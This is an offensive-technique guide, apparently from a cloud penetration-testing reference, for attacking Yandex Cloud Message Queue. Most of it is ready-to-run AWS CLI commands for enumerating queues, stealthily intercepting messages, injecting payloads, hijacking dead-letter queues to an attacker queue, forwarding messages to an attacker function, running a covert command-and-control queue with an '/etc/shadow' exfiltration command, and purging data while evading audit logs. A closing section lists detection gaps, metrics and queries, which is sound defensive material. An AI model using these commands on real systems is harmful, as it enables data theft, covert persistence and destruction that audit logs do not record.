# Yandex Cloud - Message Queue Techniques

## Service Overview

Yandex Cloud Message Queue is an SQS-compatible message queuing service for distributed application messaging. It uses the AWS SQS HTTP API with AWS Signature Version 4 authentication via static access keys tied to IAM service accounts. There are no native `yc` CLI commands — all operations use AWS CLI/SDK tooling.

Key concepts:
- **Standard Queues**: At-least-once delivery, best-effort ordering, up to 120,000 in-flight messages
- **FIFO Queues**: Exactly-once delivery, strict ordering, up to 20,000 in-flight messages (names must end with `.fifo`)
- **Dead Letter Queues (DLQ)**: Receive messages that consumers fail to process, configured via `RedrivePolicy`
- **Visibility Timeout**: 0 to 12 hours; controls how long a received message is hidden from other consumers
- **Message Retention**: 60 seconds to 14 days (default 4 days); messages auto-deleted after this period
- **Authentication**: Static access keys (`AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`) — not IAM tokens
- **Endpoint**: `https://message-queue.api.cloud.yandex.net/`
- **Critical**: `ymq.reader` can read, delete, AND purge entire queues despite its name
- **Critical**: Only 3 control plane events are logged — all data plane operations are invisible to Audit Trails

---

## Enumeration

### List and Inspect Queues

```bash
# Configure AWS CLI for Yandex Cloud
aws configure
# AWS Access Key ID: <service_account_key_ID>
# AWS Secret Access Key: <service_account_secret_key>
# Default region name: ru-central1
# Default output format: json

# List all queues (up to 1,000; reveals folder IDs in URLs)
aws sqs list-queues \
  --endpoint https://message-queue.api.cloud.yandex.net/

# Filter by prefix
aws sqs list-queues --queue-name-prefix prod \
  --endpoint https://message-queue.api.cloud.yandex.net/

# Get queue URL by name
aws sqs get-queue-url --queue-name <QUEUE-NAME> \
  --endpoint https://message-queue.api.cloud.yandex.net/

# Get all queue attributes (ARN, message counts, DLQ config, retention)
aws sqs get-queue-attributes --queue-url <QUEUE-URL> \
  --attribute-names All \
  --endpoint https://message-queue.api.cloud.yandex.net/

# List queue tags
aws sqs list-queue-tags --queue-url <QUEUE-URL> \
  --endpoint https://message-queue.api.cloud.yandex.net/
```

Key attributes from `GetQueueAttributes`:
- `QueueArn` — needed for DLQ targeting
- `ApproximateNumberOfMessages` — reveals data presence
- `RedrivePolicy` — shows DLQ configuration
- `MessageRetentionPeriod` — current retention setting
- `VisibilityTimeout` — current visibility timeout

### Direct API Call (cURL)

```bash
curl --request POST \
  --header 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'Action=ListQueues' \
  --data-urlencode 'Version=2012-11-05' \
  --user '<access_key_ID>:<secret_key>' \
  --aws-sigv4 'aws:amz:ru-central1:sqs' \
  https://message-queue.api.cloud.yandex.net/
```

---

## Credential Access

### Static Access Keys in Terraform Configs

Terraform configurations for Message Queue embed static access keys in plaintext:

```hcl
provider "yandex" {
  # ...
}

resource "yandex_message_queue" "example" {
  access_key = "AKIA..."    # Plaintext key ID
  secret_key = "wJalr..."   # Plaintext secret key
  # ...
}
```

Search for these in version control, Terraform state files, and CI/CD configurations.

### Message Content May Contain Credentials

Applications frequently pass credentials, tokens, and connection strings via message queues:

```bash
# Read messages non-destructively (visibility timeout 0)
aws sqs receive-message --queue-url <QUEUE-URL> \
  --max-number-of-messages 10 \
  --attribute-names All --message-attribute-names All \
  --visibility-timeout 0 \
  --endpoint https://message-queue.api.cloud.yandex.net/
```

Setting `--visibility-timeout 0` makes messages immediately available again — a non-destructive read that doesn't affect legitimate consumers.

---

## Lateral Movement

### Message Interception

Read messages from queues to intercept application data:

```bash
# Receive messages (up to 10 per call, 300 calls/sec for standard queues)
aws sqs receive-message --queue-url <QUEUE-URL> \
  --max-number-of-messages 10 \
  --attribute-names All --message-attribute-names All \
  --visibility-timeout 0 \
  --endpoint https://message-queue.api.cloud.yandex.net/
```

The `SenderId` attribute reveals the IAM user who sent each message. Setting visibility timeout to 0 ensures messages remain available to legitimate consumers (stealth).

### Message Injection

Inject malicious messages into application queues:

```bash
# Send a single message
aws sqs send-message --queue-url <QUEUE-URL> \
  --message-body '{"action":"execute","command":"..."}' \
  --endpoint https://message-queue.api.cloud.yandex.net/

# Batch send up to 10 messages
aws sqs send-message-batch --queue-url <QUEUE-URL> \
  --entries '[{"Id":"1","MessageBody":"payload1"},{"Id":"2","MessageBody":"payload2"}]' \
  --endpoint https://message-queue.api.cloud.yandex.net/
```

### DLQ Hijacking

Redirect a queue's dead letter policy to an attacker-controlled queue to capture failed messages:

```bash
# Step 1: Create attacker DLQ
aws sqs create-queue --queue-name attacker-dlq \
  --endpoint https://message-queue.api.cloud.yandex.net/

# Step 2: Get attacker DLQ ARN
aws sqs get-queue-attributes --queue-url <ATTACKER-DLQ-URL> \
  --attribute-names QueueArn \
  --endpoint https://message-queue.api.cloud.yandex.net/

# Step 3: Point victim queue to attacker DLQ with maxReceiveCount=1
aws sqs set-queue-attributes --queue-url <VICTIM-QUEUE-URL> \
  --attributes '{"RedrivePolicy":"{\"deadLetterTargetArn\":\"<ATTACKER-DLQ-ARN>\",\"maxReceiveCount\":\"1\"}"}' \
  --endpoint https://message-queue.api.cloud.yandex.net/
```

With `maxReceiveCount=1`, every message is moved to the attacker DLQ after a single receive attempt.

### Serverless Trigger Abuse

Create a serverless trigger that pipes queue messages to an attacker-controlled function:

```bash
# Create trigger to forward messages to attacker function
yc serverless trigger create message-queue <TRIGGER-NAME> \
  --queue <QUEUE-ID> \
  --queue-service-account-id <SA-ID> \
  --invoke-function-id <ATTACKER-FUNCTION-ID> \
  --invoke-function-service-account-id <SA-ID>
```

### Visibility Timeout Abuse

Hide messages from legitimate consumers for up to 12 hours:

```bash
# Receive message to get ReceiptHandle
aws sqs receive-message --queue-url <QUEUE-URL> \
  --endpoint https://message-queue.api.cloud.yandex.net/

# Set maximum visibility timeout (12 hours)
aws sqs change-message-visibility --queue-url <QUEUE-URL> \
  --receipt-handle <RECEIPT-HANDLE> --visibility-timeout 43200 \
  --endpoint https://message-queue.api.cloud.yandex.net/
```

---

## Persistence

### Rogue Queue as C2 Channel

Create a queue for covert command-and-control communication:

```bash
# Create C2 queue with innocuous name
aws sqs create-queue --queue-name monitoring-health-checks \
  --endpoint https://message-queue.api.cloud.yandex.net/

# Send C2 commands
aws sqs send-message --queue-url <C2-QUEUE-URL> \
  --message-body '{"cmd":"exfiltrate","target":"/etc/shadow"}' \
  --endpoint https://message-queue.api.cloud.yandex.net/

# Read C2 responses
aws sqs receive-message --queue-url <C2-QUEUE-URL> \
  --visibility-timeout 0 \
  --endpoint https://message-queue.api.cloud.yandex.net/
```

Queue creation generates an audit event, but all subsequent message operations are invisible.

### Message Retention Manipulation

Reduce retention to auto-delete evidence:

```bash
# Set minimum retention (60 seconds) — messages auto-delete after 1 minute
aws sqs set-queue-attributes --queue-url <QUEUE-URL> \
  --attributes '{"MessageRetentionPeriod":"60"}' \
  --endpoint https://message-queue.api.cloud.yandex.net/
```

---

## Post-Exploitation

### Data Destruction

```bash
# Purge all messages from a queue (irreversible)
aws sqs purge-queue --queue-url <QUEUE-URL> \
  --endpoint https://message-queue.api.cloud.yandex.net/

# Delete a queue entirely
aws sqs delete-queue --queue-url <QUEUE-URL> \
  --endpoint https://message-queue.api.cloud.yandex.net/

# Batch delete specific messages (up to 10)
aws sqs delete-message-batch --queue-url <QUEUE-URL> \
  --entries '[{"Id":"1","ReceiptHandle":"<handle>"}]' \
  --endpoint https://message-queue.api.cloud.yandex.net/
```

**`ymq.reader` is sufficient for PurgeQueue and DeleteMessage** — these destructive operations don't require admin.

### Queue Attribute Manipulation

```bash
# Set minimum retention — auto-delete all messages after 60 seconds
aws sqs set-queue-attributes --queue-url <QUEUE-URL> \
  --attributes '{"MessageRetentionPeriod":"60"}' \
  --endpoint https://message-queue.api.cloud.yandex.net/

# Set visibility timeout to 0 — all consumers see all messages simultaneously (causes duplicates)
aws sqs set-queue-attributes --queue-url <QUEUE-URL> \
  --attributes '{"VisibilityTimeout":"0"}' \
  --endpoint https://message-queue.api.cloud.yandex.net/

# Add maximum delay (15 minutes) to slow processing
aws sqs set-queue-attributes --queue-url <QUEUE-URL> \
  --attributes '{"DelaySeconds":"900"}' \
  --endpoint https://message-queue.api.cloud.yandex.net/
```

---

## Key IAM Roles

| Role | Capabilities |
|---|---|
| `ymq.reader` | List queues, get attributes, **receive messages**, **delete messages**, **purge queues**, change visibility |
| `ymq.writer` | List queues, get attributes, **send messages**, **create queues** |
| `ymq.admin` | All reader + writer capabilities + **set queue attributes**, **delete queues**, manage tags |

**Warning**: `ymq.reader` is deceptively powerful — it can purge entire queues and delete individual messages despite the "reader" name. Roles are assigned at folder or cloud level and apply to ALL queues in that scope.

---

## Detection and Logging

### Audit Trail Events

Source: `yandex.cloud.audit.ymq.*`

| Event | Description | Security Relevance |
|---|---|---|
| `CreateMessageQueue` | Creating a queue | Rogue queue creation |
| `DeleteMessageQueue` | Deleting a queue | Service disruption |
| `UpdateMessageQueue` | Modifying queue attributes | **DLQ hijack, retention manipulation** |

### Critical Detection Gaps

- **Only 3 control plane events**: Queue creation, deletion, and attribute modification
- **ALL data plane operations are invisible**: `SendMessage`, `ReceiveMessage`, `DeleteMessage`, `PurgeQueue`, `ChangeMessageVisibility`, `GetQueueAttributes`, `ListQueues` generate NO audit trail events
- An attacker can read, exfiltrate, delete, and purge all messages without any audit log entries

### Monitoring Metrics (Only Detection Path)

Since audit trails miss data plane events, Yandex Monitoring metrics are the only detection mechanism:

| Metric | Detection Use |
|---|---|
| `api.http.requests_count_per_second` (with `method` label) | Spike in `ReceiveMessage` or `PurgeQueue` calls |
| `queue.messages.purged_count_per_second` | PurgeQueue activity |
| `queue.messages.deleted_count_per_second` | Abnormal message deletion rate |
| `queue.messages.stored_count` | Sudden drops indicate exfiltration or deletion |
| `queue.messages.received_count_per_second` | Unusual read activity |
| `queue.messages.sent_count_per_second` | Message injection |

### Detection Queries

**Detect queue manipulation (audit trail)**:
```
event_type IN ("CreateMessageQueue", "DeleteMessageQueue", "UpdateMessageQueue")
```

**Detect data plane anomalies (monitoring)**:
- Alert on sudden increase in `received_count_per_second` from unusual service accounts
- Alert on any `purged_count_per_second > 0`
- Alert on sudden drops in `stored_count`

---

## References

- Message Queue Concepts: `en/message-queue/concepts/index.md`
- Queue Types: `en/message-queue/concepts/queue.md`
- Messages: `en/message-queue/concepts/message.md`
- Dead Letter Queues: `en/message-queue/concepts/dlq.md`
- Visibility Timeout: `en/message-queue/concepts/visibility-timeout.md`
- Security: `en/message-queue/security/index.md`
- API Reference: `en/message-queue/api-ref/`
- Queue API: `en/message-queue/api-ref/queue/`
- Message API: `en/message-queue/api-ref/message/`
- Audit Events: `en/_includes/audit-trails/events/ymq-events.md`
- Monitoring Metrics: `en/_includes/monitoring/metrics-ref/message-queue.md`
